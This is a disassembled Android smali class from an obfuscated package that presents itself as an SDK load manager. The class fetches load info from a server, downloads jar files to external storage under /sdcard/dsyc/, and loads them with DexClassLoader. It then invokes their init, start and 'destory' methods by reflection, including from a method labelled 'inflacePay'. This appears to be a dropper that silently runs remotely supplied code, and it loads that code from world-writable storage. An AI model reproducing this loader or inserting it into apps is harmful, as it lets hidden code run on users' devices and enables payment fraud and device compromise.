.class public Lbn/sdk/szwcsss/coddxcxc/t/b;
.super Ljava/lang/Object;


# static fields
.field private static for:Lbn/sdk/szwcsss/coddxcxc/t/b;


# instance fields
.field private aa:Landroid/content/Context;

.field b:Ljava/util/Map;

.field private cx:Ljava/util/List;

.field private throw:Ljava/lang/String;

.field private while:I


# direct methods
.method static constructor <clinit>()V
    .locals 1

    const/4 v0, 0x0

    sput-object v0, Lbn/sdk/szwcsss/coddxcxc/t/b;->for:Lbn/sdk/szwcsss/coddxcxc/t/b;

    return-void
.end method

.method public constructor <init>()V
    .locals 1

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    new-instance v0, Ljava/util/ArrayList;

    invoke-direct {v0}, Ljava/util/ArrayList;-><init>()V

    iput-object v0, p0, Lbn/sdk/szwcsss/coddxcxc/t/b;->cx:Ljava/util/List;

    new-instance v0, Ljava/util/HashMap;

    invoke-direct {v0}, Ljava/util/HashMap;-><init>()V

    iput-object v0, p0, Lbn/sdk/szwcsss/coddxcxc/t/b;->b:Ljava/util/Map;

    const/4 v0, 0x0

    iput v0, p0, Lbn/sdk/szwcsss/coddxcxc/t/b;->while:I

    return-void
.end method

.method public static b()Lbn/sdk/szwcsss/coddxcxc/t/b;
    .locals 1

    sget-object v0, Lbn/sdk/szwcsss/coddxcxc/t/b;->for:Lbn/sdk/szwcsss/coddxcxc/t/b;

    if-nez v0, :cond_0

    new-instance v0, Lbn/sdk/szwcsss/coddxcxc/t/b;

    invoke-direct {v0}, Lbn/sdk/szwcsss/coddxcxc/t/b;-><init>()V

    sput-object v0, Lbn/sdk/szwcsss/coddxcxc/t/b;->for:Lbn/sdk/szwcsss/coddxcxc/t/b;

    :cond_0
    sget-object v0, Lbn/sdk/szwcsss/coddxcxc/t/b;->for:Lbn/sdk/szwcsss/coddxcxc/t/b;

    return-object v0
.end method

.method static synthetic b(Lbn/sdk/szwcsss/coddxcxc/t/b;)Ljava/util/List;
    .locals 1

    iget-object v0, p0, Lbn/sdk/szwcsss/coddxcxc/t/b;->cx:Ljava/util/List;

    return-object v0
.end method

.method private b(Landroid/content/Context;Lbn/sdk/szwcsss/coddxcxc/w/for;)V
    .locals 5

    const-string v0, "downFile start"

    invoke-static {v0}, Lbn/sdk/szwcsss/coddxcxc/y/throw;->b(Ljava/lang/String;)V

    if-nez p2, :cond_0

    :goto_0
    return-void

    :cond_0
    invoke-static {}, Landroid/os/Environment;->getExternalStorageDirectory()Ljava/io/File;

    move-result-object v0

    invoke-virtual {v0}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;

    move-result-object v0

    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v1, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v1, "/dsyc/"

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {p2}, Lbn/sdk/szwcsss/coddxcxc/w/for;->aa()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    const-string v1, "downFile name :%s - %s"

    const/4 v2, 0x2

    new-array v2, v2, [Ljava/lang/Object;

    const/4 v3, 0x0

    invoke-virtual {p2}, Lbn/sdk/szwcsss/coddxcxc/w/for;->cx()Ljava/lang/String;

    move-result-object v4

    aput-object v4, v2, v3

    const/4 v3, 0x1

    aput-object v0, v2, v3

    invoke-static {v1, v2}, Lbn/sdk/szwcsss/coddxcxc/y/throw;->b(Ljava/lang/String;[Ljava/lang/Object;)V

    new-instance v1, Lbn/sdk/szwcsss/coddxcxc/z/for;

    invoke-direct {v1}, Lbn/sdk/szwcsss/coddxcxc/z/for;-><init>()V

    new-instance v2, Lbn/sdk/szwcsss/coddxcxc/t/aa;

    const/4 v3, 0x0

    invoke-direct {v2, p0, v3}, Lbn/sdk/szwcsss/coddxcxc/t/aa;-><init>(Lbn/sdk/szwcsss/coddxcxc/t/b;Lbn/sdk/szwcsss/coddxcxc/t/for;)V

    invoke-virtual {p2}, Lbn/sdk/szwcsss/coddxcxc/w/for;->cx()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v1, v2, v3, v0}, Lbn/sdk/szwcsss/coddxcxc/z/for;->b(Lbn/sdk/szwcsss/coddxcxc/z/cx;Ljava/lang/String;Ljava/lang/String;)V

    goto :goto_0
.end method

.method private varargs b(Landroid/content/Context;Ljava/lang/String;[Ljava/lang/Object;)V
    .locals 11

    const/4 v10, 0x1

    const/4 v9, 0x0

    const-string v0, "inflace method :%s"

    new-array v1, v10, [Ljava/lang/Object;

    aput-object p2, v1, v9

    invoke-static {v0, v1}, Lbn/sdk/szwcsss/coddxcxc/y/throw;->b(Ljava/lang/String;[Ljava/lang/Object;)V

    iget-object v0, p0, Lbn/sdk/szwcsss/coddxcxc/t/b;->cx:Ljava/util/List;

    if-eqz v0, :cond_0

    iget-object v0, p0, Lbn/sdk/szwcsss/coddxcxc/t/b;->cx:Ljava/util/List;

    invoke-interface {v0}, Ljava/util/List;->size()I

    move-result v0

    if-nez v0, :cond_2

    :cond_0
    const-string v0, "inflace method getSyncLoadInfo %s"

    new-array v1, v10, [Ljava/lang/Object;

    aput-object p2, v1, v9

    invoke-static {v0, v1}, Lbn/sdk/szwcsss/coddxcxc/y/throw;->b(Ljava/lang/String;[Ljava/lang/Object;)V

    invoke-virtual {p0, p1}, Lbn/sdk/szwcsss/coddxcxc/t/b;->b(Landroid/content/Context;)V

    :cond_1
    return-void

    :cond_2
    const-string v0, "inflace exe"

    invoke-static {v0}, Lbn/sdk/szwcsss/coddxcxc/y/throw;->b(Ljava/lang/String;)V

    invoke-static {}, Landroid/os/Environment;->getExternalStorageDirectory()Ljava/io/File;

    move-result-object v0

    invoke-virtual {v0}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;

    move-result-object v7

    iget-object v0, p0, Lbn/sdk/szwcsss/coddxcxc/t/b;->cx:Ljava/util/List;

    invoke-interface {v0}, Ljava/util/List;->iterator()Ljava/util/Iterator;

    move-result-object v8

    :cond_3
    :goto_0
    invoke-interface {v8}, Ljava/util/Iterator;->hasNext()Z

    move-result v0

    if-eqz v0, :cond_1

    invoke-interface {v8}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v0

    move-object v6, v0

    check-cast v6, Lbn/sdk/szwcsss/coddxcxc/w/for;

    const-string v0, "inflace DsyncLoadInfo %s"

    new-array v1, v10, [Ljava/lang/Object;

    aput-object v6, v1, v9

    invoke-static {v0, v1}, Lbn/sdk/szwcsss/coddxcxc/y/throw;->b(Ljava/lang/String;[Ljava/lang/Object;)V

    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v0, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v1, "/dsyc/"

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v6}, Lbn/sdk/szwcsss/coddxcxc/w/for;->aa()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    const-string v0, "inflace jarPath %s"

    new-array v1, v10, [Ljava/lang/Object;

    aput-object v2, v1, v9

    invoke-static {v0, v1}, Lbn/sdk/szwcsss/coddxcxc/y/throw;->b(Ljava/lang/String;[Ljava/lang/Object;)V

    invoke-virtual {v6}, Lbn/sdk/szwcsss/coddxcxc/w/for;->aa()Ljava/lang/String;

    move-result-object v0

    invoke-direct {p0, v0}, Lbn/sdk/szwcsss/coddxcxc/t/b;->b(Ljava/lang/String;)Z

    move-result v0

    if-nez v0, :cond_4

    invoke-direct {p0, p1}, Lbn/sdk/szwcsss/coddxcxc/t/b;->for(Landroid/content/Context;)V

    goto :goto_0

    :cond_4
    const-string v0, "DsycLoadClass exe inflace :%s"

    new-array v1, v10, [Ljava/lang/Object;

    aput-object v2, v1, v9

    invoke-static {v0, v1}, Lbn/sdk/szwcsss/coddxcxc/y/throw;->b(Ljava/lang/String;[Ljava/lang/Object;)V

    :try_start_0
    invoke-virtual {p1}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    const-string v1, "dsyc"

    const/4 v3, 0x0

    invoke-virtual {v0, v1, v3}, Landroid/content/Context;->getDir(Ljava/lang/String;I)Ljava/io/File;

    move-result-object v0

    invoke-virtual {v0}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;

    move-result-object v3

    const-string v0, "DsycLoadClass tmpPath :%s"

    const/4 v1, 0x1

    new-array v1, v1, [Ljava/lang/Object;

    const/4 v4, 0x0

    aput-object v3, v1, v4

    invoke-static {v0, v1}, Lbn/sdk/szwcsss/coddxcxc/y/throw;->b(Ljava/lang/String;[Ljava/lang/Object;)V

    const-string v0, "DsycLoadClass jarPath :%s"

    const/4 v1, 0x1

    new-array v1, v1, [Ljava/lang/Object;

    const/4 v4, 0x0

    aput-object v3, v1, v4

    invoke-static {v0, v1}, Lbn/sdk/szwcsss/coddxcxc/y/throw;->b(Ljava/lang/String;[Ljava/lang/Object;)V

    iget-object v0, p0, Lbn/sdk/szwcsss/coddxcxc/t/b;->b:Ljava/util/Map;

    invoke-virtual {v6}, Lbn/sdk/szwcsss/coddxcxc/w/for;->aa()Ljava/lang/String;

    move-result-object v1

    invoke-interface {v0, v1}, Ljava/util/Map;->get(Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Ldalvik/system/DexClassLoader;

    if-nez v0, :cond_5

    new-instance v0, Lbn/sdk/szwcsss/coddxcxc/t/for;

    const/4 v4, 0x0

    const-class v1, Lbn/sdk/szwcsss/coddxcxc/t/b;

    invoke-virtual {v1}, Ljava/lang/Class;->getClassLoader()Ljava/lang/ClassLoader;

    move-result-object v5

    move-object v1, p0

    invoke-direct/range {v0 .. v5}, Lbn/sdk/szwcsss/coddxcxc/t/for;-><init>(Lbn/sdk/szwcsss/coddxcxc/t/b;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/ClassLoader;)V

    iget-object v1, p0, Lbn/sdk/szwcsss/coddxcxc/t/b;->b:Ljava/util/Map;

    invoke-virtual {v6}, Lbn/sdk/szwcsss/coddxcxc/w/for;->aa()Ljava/lang/String;

    move-result-object v2

    invoke-interface {v1, v2, v0}, Ljava/util/Map;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    :cond_5
    const-string v1, "DexClassLoader loadClass :%s"

    const/4 v2, 0x1

    new-array v2, v2, [Ljava/lang/Object;

    const/4 v4, 0x0

    aput-object v3, v2, v4

    invoke-static {v1, v2}, Lbn/sdk/szwcsss/coddxcxc/y/throw;->b(Ljava/lang/String;[Ljava/lang/Object;)V

    invoke-virtual {v6}, Lbn/sdk/szwcsss/coddxcxc/w/for;->b()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ldalvik/system/DexClassLoader;->loadClass(Ljava/lang/String;)Ljava/lang/Class;

    move-result-object v0

    const/4 v1, 0x0

    new-array v1, v1, [Ljava/lang/Class;

    invoke-virtual {v0, v1}, Ljava/lang/Class;->getConstructor([Ljava/lang/Class;)Ljava/lang/reflect/Constructor;

    move-result-object v1

    const/4 v2, 0x0

    new-array v2, v2, [Ljava/lang/Object;

    invoke-virtual {v1, v2}, Ljava/lang/reflect/Constructor;->newInstance([Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v1

    const-string v2, "init"

    invoke-virtual {v2, p2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-eqz v2, :cond_6

    const/4 v2, 0x2

    new-array v2, v2, [Ljava/lang/Class;

    const/4 v3, 0x0

    const-class v4, Landroid/content/Context;

    aput-object v4, v2, v3

    const/4 v3, 0x1

    const-class v4, Ljava/lang/String;

    aput-object v4, v2, v3

    invoke-virtual {v0, p2, v2}, Ljava/lang/Class;->getDeclaredMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v0

    const/4 v2, 0x1

    invoke-virtual {v0, v2}, Ljava/lang/reflect/Method;->setAccessible(Z)V

    invoke-virtual {v0, v1, p3}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto/16 :goto_0

    :catch_0
    move-exception v0

    invoke-virtual {v0}, Ljava/lang/Exception;->printStackTrace()V

    const-string v1, "DexClassLoader Exception :%s"

    new-array v2, v10, [Ljava/lang/Object;

    invoke-virtual {v0}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v0

    aput-object v0, v2, v9

    invoke-static {v1, v2}, Lbn/sdk/szwcsss/coddxcxc/y/throw;->b(Ljava/lang/String;[Ljava/lang/Object;)V

    goto/16 :goto_0

    :cond_6
    :try_start_1
    const-string v2, "destory"

    invoke-virtual {v2, p2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-eqz v2, :cond_7

    const/4 v2, 0x1

    new-array v2, v2, [Ljava/lang/Class;

    const/4 v3, 0x0

    const-class v4, Landroid/content/Context;

    aput-object v4, v2, v3

    invoke-virtual {v0, p2, v2}, Ljava/lang/Class;->getDeclaredMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v0

    const/4 v2, 0x1

    invoke-virtual {v0, v2}, Ljava/lang/reflect/Method;->setAccessible(Z)V

    invoke-virtual {v0, v1, p3}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;

    goto/16 :goto_0

    :cond_7
    const-string v2, "start"

    invoke-virtual {v2, p2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-eqz v2, :cond_3

    const/4 v2, 0x3

    new-array v2, v2, [Ljava/lang/Class;

    const/4 v3, 0x0

    const-class v4, Landroid/content/Context;

    aput-object v4, v2, v3

    const/4 v3, 0x1

    const-class v4, Ljava/lang/Integer;

    aput-object v4, v2, v3

    const/4 v3, 0x2

    const-class v4, Landroid/os/Handler;

    aput-object v4, v2, v3

    invoke-virtual {v0, p2, v2}, Ljava/lang/Class;->getDeclaredMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v0

    const/4 v2, 0x1

    invoke-virtual {v0, v2}, Ljava/lang/reflect/Method;->setAccessible(Z)V

    invoke-virtual {v0, v1, p3}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0

    goto/16 :goto_0
.end method

.method static synthetic b(Lbn/sdk/szwcsss/coddxcxc/t/b;Landroid/content/Context;)V
    .locals 0

    invoke-direct {p0, p1}, Lbn/sdk/szwcsss/coddxcxc/t/b;->for(Landroid/content/Context;)V

    return-void
.end method

.method private b(Ljava/lang/String;)Z
    .locals 2

    const-string v0, "check file isExict"

    invoke-static {v0}, Lbn/sdk/szwcsss/coddxcxc/y/throw;->b(Ljava/lang/String;)V

    invoke-static {}, Landroid/os/Environment;->getExternalStorageDirectory()Ljava/io/File;

    move-result-object v0

    invoke-virtual {v0}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;

    move-result-object v0

    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v1, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v1, "/dsyc/"

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    new-instance v1, Ljava/io/File;

    invoke-direct {v1, v0}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    invoke-virtual {v1}, Ljava/io/File;->exists()Z

    move-result v0

    if-eqz v0, :cond_0

    const/4 v0, 0x1

    :goto_0
    return v0

    :cond_0
    const/4 v0, 0x0

    goto :goto_0
.end method

.method static synthetic cx(Lbn/sdk/szwcsss/coddxcxc/t/b;)Ljava/lang/String;
    .locals 1

    iget-object v0, p0, Lbn/sdk/szwcsss/coddxcxc/t/b;->throw:Ljava/lang/String;

    return-object v0
.end method

.method static synthetic for(Lbn/sdk/szwcsss/coddxcxc/t/b;)Landroid/content/Context;
    .locals 1

    iget-object v0, p0, Lbn/sdk/szwcsss/coddxcxc/t/b;->aa:Landroid/content/Context;

    return-object v0
.end method

.method private for(Landroid/content/Context;)V
    .locals 5

    iget-object v0, p0, Lbn/sdk/szwcsss/coddxcxc/t/b;->cx:Ljava/util/List;

    if-eqz v0, :cond_0

    iget-object v0, p0, Lbn/sdk/szwcsss/coddxcxc/t/b;->cx:Ljava/util/List;

    invoke-interface {v0}, Ljava/util/List;->size()I

    move-result v0

    if-nez v0, :cond_1

    :cond_0
    return-void

    :cond_1
    const-string v0, "DsyncInfoHttpListener loadFile start"

    invoke-static {v0}, Lbn/sdk/szwcsss/coddxcxc/y/throw;->b(Ljava/lang/String;)V

    iget-object v0, p0, Lbn/sdk/szwcsss/coddxcxc/t/b;->cx:Ljava/util/List;

    invoke-interface {v0}, Ljava/util/List;->iterator()Ljava/util/Iterator;

    move-result-object v1

    :cond_2
    :goto_0
    invoke-interface {v1}, Ljava/util/Iterator;->hasNext()Z

    move-result v0

    if-eqz v0, :cond_0

    invoke-interface {v1}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Lbn/sdk/szwcsss/coddxcxc/w/for;

    const-string v2, "DsyncLoadInfo info : %s"

    const/4 v3, 0x1

    new-array v3, v3, [Ljava/lang/Object;

    const/4 v4, 0x0

    aput-object v0, v3, v4

    invoke-static {v2, v3}, Lbn/sdk/szwcsss/coddxcxc/y/throw;->b(Ljava/lang/String;[Ljava/lang/Object;)V

    if-eqz v0, :cond_2

    invoke-virtual {v0}, Lbn/sdk/szwcsss/coddxcxc/w/for;->aa()Ljava/lang/String;

    move-result-object v2

    invoke-direct {p0, v2}, Lbn/sdk/szwcsss/coddxcxc/t/b;->b(Ljava/lang/String;)Z

    move-result v2

    if-nez v2, :cond_3

    invoke-direct {p0, p1, v0}, Lbn/sdk/szwcsss/coddxcxc/t/b;->b(Landroid/content/Context;Lbn/sdk/szwcsss/coddxcxc/w/for;)V

    goto :goto_0

    :cond_3
    iget-object v0, p0, Lbn/sdk/szwcsss/coddxcxc/t/b;->aa:Landroid/content/Context;

    if-eqz v0, :cond_2

    iget-object v0, p0, Lbn/sdk/szwcsss/coddxcxc/t/b;->throw:Ljava/lang/String;

    invoke-static {v0}, Lbn/sdk/szwcsss/coddxcxc/y/private;->b(Ljava/lang/String;)Z

    move-result v0

    if-nez v0, :cond_2

    iget-object v0, p0, Lbn/sdk/szwcsss/coddxcxc/t/b;->aa:Landroid/content/Context;

    iget-object v2, p0, Lbn/sdk/szwcsss/coddxcxc/t/b;->throw:Ljava/lang/String;

    invoke-virtual {p0, v0, v2}, Lbn/sdk/szwcsss/coddxcxc/t/b;->b(Landroid/content/Context;Ljava/lang/String;)V

    goto :goto_0
.end method


# virtual methods
.method public b(Landroid/content/Context;)V
    .locals 4

    iput-object p1, p0, Lbn/sdk/szwcsss/coddxcxc/t/b;->aa:Landroid/content/Context;

    :try_start_0
    new-instance v0, Lbn/sdk/szwcsss/coddxcxc/z/b;

    invoke-direct {v0}, Lbn/sdk/szwcsss/coddxcxc/z/b;-><init>()V

    new-instance v0, Lorg/json/JSONObject;

    invoke-direct {v0}, Lorg/json/JSONObject;-><init>()V

    new-instance v1, Lbn/sdk/szwcsss/coddxcxc/w/b;

    invoke-direct {v1, p1}, Lbn/sdk/szwcsss/coddxcxc/w/b;-><init>(Landroid/content/Context;)V

    invoke-virtual {v1}, Lbn/sdk/szwcsss/coddxcxc/w/b;->for()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1}, Lbn/sdk/szwcsss/coddxcxc/w/b;->b()Lorg/json/JSONObject;

    move-result-object v1

    invoke-virtual {v0, v2, v1}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    const/16 v1, 0xd

    new-instance v2, Lbn/sdk/szwcsss/coddxcxc/t/cx;

    const/4 v3, 0x0

    invoke-direct {v2, p0, v3}, Lbn/sdk/szwcsss/coddxcxc/t/cx;-><init>(Lbn/sdk/szwcsss/coddxcxc/t/b;Lbn/sdk/szwcsss/coddxcxc/t/for;)V

    invoke-static {p1, v1, v0, v2}, Lbn/sdk/szwcsss/coddxcxc/z/b;->b(Landroid/content/Context;ILorg/json/JSONObject;Lbn/sdk/szwcsss/coddxcxc/z/aa;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :goto_0
    return-void

    :catch_0
    move-exception v0

    invoke-virtual {v0}, Ljava/lang/Exception;->printStackTrace()V

    const-string v1, "DsyncLoadManager getSyncLoadInfo Exception :%s"

    const/4 v2, 0x1

    new-array v2, v2, [Ljava/lang/Object;

    const/4 v3, 0x0

    invoke-virtual {v0}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v0

    aput-object v0, v2, v3

    invoke-static {v1, v2}, Lbn/sdk/szwcsss/coddxcxc/y/throw;->b(Ljava/lang/String;[Ljava/lang/Object;)V

    goto :goto_0
.end method

.method public b(Landroid/content/Context;ILandroid/os/Handler;)V
    .locals 4

    const-string v0, "inflacePay start"

    invoke-static {v0}, Lbn/sdk/szwcsss/coddxcxc/y/throw;->b(Ljava/lang/String;)V

    const-string v0, "start"

    const/4 v1, 0x3

    new-array v1, v1, [Ljava/lang/Object;

    const/4 v2, 0x0

    aput-object p1, v1, v2

    const/4 v2, 0x1

    invoke-static {p2}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v3

    aput-object v3, v1, v2

    const/4 v2, 0x2

    aput-object p3, v1, v2

    invoke-direct {p0, p1, v0, v1}, Lbn/sdk/szwcsss/coddxcxc/t/b;->b(Landroid/content/Context;Ljava/lang/String;[Ljava/lang/Object;)V

    return-void
.end method

.method public b(Landroid/content/Context;Ljava/lang/String;)V
    .locals 3

    iget v0, p0, Lbn/sdk/szwcsss/coddxcxc/t/b;->while:I

    const/16 v1, 0xa

    if-le v0, v1, :cond_0

    :goto_0
    return-void

    :cond_0
    iget v0, p0, Lbn/sdk/szwcsss/coddxcxc/t/b;->while:I

    add-int/lit8 v0, v0, 0x1

    iput v0, p0, Lbn/sdk/szwcsss/coddxcxc/t/b;->while:I

    iput-object p2, p0, Lbn/sdk/szwcsss/coddxcxc/t/b;->throw:Ljava/lang/String;

    const-string v0, "inflaceInit start"

    invoke-static {v0}, Lbn/sdk/szwcsss/coddxcxc/y/throw;->b(Ljava/lang/String;)V

    const-string v0, "init"

    const/4 v1, 0x2

    new-array v1, v1, [Ljava/lang/Object;

    const/4 v2, 0x0

    aput-object p1, v1, v2

    const/4 v2, 0x1

    aput-object p2, v1, v2

    invoke-direct {p0, p1, v0, v1}, Lbn/sdk/szwcsss/coddxcxc/t/b;->b(Landroid/content/Context;Ljava/lang/String;[Ljava/lang/Object;)V

    goto :goto_0
.end method
